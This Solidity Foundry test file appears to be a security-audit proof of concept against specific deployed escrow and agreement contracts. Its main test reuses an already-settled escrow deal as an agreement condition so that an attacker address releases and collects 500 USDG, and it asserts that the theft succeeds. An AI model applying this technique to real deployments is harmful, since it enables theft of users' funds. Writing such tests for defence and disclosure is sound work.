// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/Mocks.sol";

// ROUND 39 — Tim A. Live SDK b6e7d25c (164.314 B, UNCHANGED vs Minor 17 — no redeploy #6).
// Contracts byte-identical (v41 sha 02c9ec6b == Minor 16).
//  - K-4466 (M-1942): B-15 re-grade — settled-deal reuse leg (from Round37
//    K-4107). Settle a REAL deal 0 in escrow v3, then createAgreement
//    kind-4 -> escrow v3 value 0, release -> +500.
//  - K-4476 (M-1937): WATCH re-probe bundle — 0x2591a130(1,0) returns 0,
//    claimTo 2-arg reverts, MAX_GAP == 300 (all dormant, as before).
//    Throwaway local keys only. No mainnet, no live calls.

interface IEscrowV3 {
    struct DealP { address seller; address sellerPayout; address buyerReceive; address sellToken; uint256 sellAmount; address payToken; uint256 payAmount; uint64 deadline; }
    struct Quote { uint16 feeBps; uint64 expiry; bytes sig; }
    struct Consent { uint64 validUntil; bytes sig; }
    function createDeal(DealP calldata p, Quote calldata q, Consent calldata c) external returns (uint256);
    function fundPayment(uint256 id) external payable;
    function fundTokens(uint256 id) external;
    function deals(uint256 id) external view returns (address buyer, address seller, address sellToken, uint256 sellAmount, address payToken, uint256 payAmount, uint64 deadline, bool buyerFunded, bool sellerFunded, uint8 status, address sellerPayout, address buyerReceive, uint16 feeBps);
}

interface IAgreementV41 {
    struct Cond { uint8 kind; address target; bytes data; uint256 value; }
    struct AgrP { address payee; address asset; uint256 amount; uint64 expiry; bytes32 termsHash; Cond[] conditions; }
    struct Fee { uint256 feeWei; uint64 expiry; bytes sig; }
    function createAgreement(AgrP calldata p, Fee calldata q) external payable returns (uint256);
    function attest(uint256 id, uint256 index) external returns (bool);
    function vote(uint256 id, uint256 index) external returns (bool);
    function release(uint256 id) external returns (bool);
}

contract Round39Test is Test {
    address constant AGREEMENT = 0x7AB58fAAe65eFCF0037635382cAA546EaC233DA6;
    address constant ESCROW_V3 = 0xd961cA37e339E14e0D3478383a252E218fe7aa4a;

    uint256 constant VICTIM_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant SELLER_PK = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
    uint256 constant ATTACKER_PK = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
    address victim;
    address seller;
    address attacker;

    MockERC20 usdg;
    MockERC20 sellToken;

    function setUp() public {
        vm.chainId(4663);
        victim = vm.addr(VICTIM_PK);
        seller = vm.addr(SELLER_PK);
        attacker = vm.addr(ATTACKER_PK);
        vm.etch(AGREEMENT, vm.parseBytes(vm.readFile("bytecode/agreement-v41-zerofee.hex")));
        vm.store(AGREEMENT, bytes32(uint256(11)), bytes32(uint256(1))); // guard unlocked (v4.1 slot 11)
        vm.store(AGREEMENT, bytes32(uint256(0)), bytes32(uint256(1))); // nextId = 1
        vm.etch(ESCROW_V3, vm.parseBytes(vm.readFile("bytecode/escrow-v3-zerofee.hex")));
        vm.store(ESCROW_V3, bytes32(uint256(5)), bytes32(uint256(1))); // reentrancy guard (escrow slot 5)
        vm.warp(1_700_000_000);
        vm.deal(victim, 100 ether);
        usdg = new MockERC20();
        sellToken = new MockERC20();
        usdg.mint(victim, 1_000_000 * 10 ** 6);
        sellToken.mint(seller, 1_000_000 * 10 ** 18);
    }

    function _createAgr(IAgreementV41.Cond[] memory conds) internal returns (bool ok, bytes memory ret) {
        vm.prank(victim);
        usdg.approve(AGREEMENT, 500 * 10 ** 6);
        vm.prank(victim);
        (ok, ret) = AGREEMENT.call(abi.encodeWithSelector(IAgreementV41.createAgreement.selector,
            IAgreementV41.AgrP({ payee: attacker, asset: address(usdg), amount: 500 * 10 ** 6, expiry: uint64(block.timestamp + 72 hours), termsHash: keccak256("After deal 1"), conditions: conds }),
            IAgreementV41.Fee({ feeWei: 0, expiry: uint64(block.timestamp + 3600), sig: new bytes(65) })));
    }

    function _consentSig(uint64 deadline, uint64 validUntil) internal view returns (bytes memory) {
        bytes32 typehash = keccak256("Consent(address buyer,address seller,address sellerPayout,address buyerReceive,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline,uint64 validUntil)");
        bytes32 structHash = keccak256(abi.encode(typehash, victim, seller, address(0), address(0), address(sellToken), uint256(1000 * 10 ** 18), address(0), uint256(0.25 ether), deadline, validUntil));
        bytes32 domainSep = keccak256(abi.encode(keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"), keccak256("BullEscrow"), keccak256("3"), uint256(4663), ESCROW_V3));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SELLER_PK, digest);
        return abi.encodePacked(r, s, v);
    }

    function _settleEscrowDeal0() internal returns (uint8 status) {
        uint64 deadline = uint64(block.timestamp + 24 hours);
        uint64 validUntil = deadline - 3600;
        bytes memory sig = _consentSig(deadline, validUntil);
        vm.prank(victim);
        uint256 id = IEscrowV3(ESCROW_V3).createDeal(
            IEscrowV3.DealP({ seller: seller, sellerPayout: address(0), buyerReceive: address(0), sellToken: address(sellToken), sellAmount: 1000 * 10 ** 18, payToken: address(0), payAmount: 0.25 ether, deadline: deadline }),
            IEscrowV3.Quote({ feeBps: 250, expiry: uint64(block.timestamp + 3600), sig: new bytes(65) }),
            IEscrowV3.Consent({ validUntil: validUntil, sig: sig })
        );
        assertEq(id, 0, "first escrow deal must be id 0");
        vm.prank(victim);
        IEscrowV3(ESCROW_V3).fundPayment{ value: 0.25 ether }(0);
        vm.prank(seller);
        sellToken.approve(ESCROW_V3, 1000 * 10 ** 18);
        vm.prank(seller);
        IEscrowV3(ESCROW_V3).fundTokens(0);
        (,,,,,,,,, status,,,) = IEscrowV3(ESCROW_V3).deals(0);
        return status;
    }

    // K-4466: B-15 settled-deal reuse re-grade (from Round37 K-4107).
    function testK4466_SettledDealReuse() public {
        uint8 st = _settleEscrowDeal0();
        emit log_named_uint("K-4466 escrow deal 0 status (2=settled)", st);
        assertEq(st, 2, "escrow deal 0 must be settled before the Agreement call");
        IAgreementV41.Cond[] memory conds = new IAgreementV41.Cond[](1);
        conds[0] = IAgreementV41.Cond({ kind: 4, target: ESCROW_V3, data: "", value: 0 });
        uint256 balBefore = usdg.balanceOf(attacker);
        (bool ok, bytes memory ret) = _createAgr(conds);
        emit log_named_string("K-4466 createAgreement kind-4 -> escrow v3 deal 0 ok", ok ? "true" : "false");
        assertTrue(ok, "createAgreement must succeed for a settled deal reference");
        uint256 agrId = abi.decode(ret, (uint256));
        vm.prank(attacker);
        (bool rel,) = AGREEMENT.call(abi.encodeWithSelector(IAgreementV41.release.selector, agrId));
        emit log_named_string("K-4466 release ok", rel ? "true" : "false");
        uint256 gained = usdg.balanceOf(attacker) - balBefore;
        emit log_named_uint("K-4466 attacker gained USDG-micro", gained);
        assertTrue(rel, "release must succeed once the referenced deal is settled");
        assertEq(gained, 500 * 10 ** 6, "attacker must gain the full 500 USDG");
    }

    // K-4476 WATCH: 0x2591a130(1,0) on live Agreement v4.1 returns 0.
    function testK4476_2591ReturnsZero() public {
        (bool ok, bytes memory ret) = AGREEMENT.staticcall(abi.encodeWithSelector(bytes4(0x2591a130), uint256(1), uint256(0)));
        assertTrue(ok, "staticcall must not revert");
        assertEq(abi.decode(ret, (uint256)), 0, "0x2591a130(1,0) == 0");
    }

    // K-4476 WATCH: claimTo 2-arg reverts (dormant).
    function testK4476_claimTo2ArgReverts() public {
        (bool ok,) = AGREEMENT.call(abi.encodeWithSignature("claimTo(uint256,address)", 1, victim));
        assertFalse(ok, "claimTo 2-arg must revert");
    }

    // K-4476 WATCH: MAX_GAP == 300 (selector 0x605036a1).
    function testK4476_MaxGap300() public {
        (bool ok, bytes memory ret) = AGREEMENT.staticcall(abi.encodeWithSelector(bytes4(0x605036a1)));
        assertTrue(ok, "MAX_GAP staticcall must not revert");
        assertEq(abi.decode(ret, (uint256)), 300, "MAX_GAP == 300");
    }
}
